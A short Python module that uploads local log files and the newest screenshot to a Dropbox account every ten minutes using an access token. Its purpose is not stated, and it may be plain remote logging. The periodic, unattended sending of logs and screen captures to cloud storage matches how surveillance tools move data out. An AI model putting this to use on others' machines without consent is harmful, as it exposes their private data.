import glob
import logging
import os
import dropbox
import time

def upload_file_to_dropbox(local_path, dbx, dropbox_folder="/logs"):
    dropbox_path = f"{dropbox_folder}/{os.path.basename(local_path)}"
    try:
        with open(local_path, "rb") as f:
            dbx.files_upload(f.read(), dropbox_path, mode=dropbox.files.WriteMode("overwrite"))
        logging.info(f"Uploaded {local_path} to Dropbox at {dropbox_path}")
    except Exception as e:
        logging.error(f"Failed to upload {local_path} to Dropbox: {e}")

def periodic_dropbox_uploader(running, access_token):
    dbx = dropbox.Dropbox(access_token)
    while running.is_set():
        for log_file in glob.glob("*.log*"):
            upload_file_to_dropbox(log_file, dbx)
        screenshots = sorted(
            [f for f in glob.glob("screenshot*.png")], key=os.path.getmtime, reverse=True
        )
        if screenshots:
            upload_file_to_dropbox(screenshots[0], dbx)
        time.sleep(600)  # Every 10 minutes
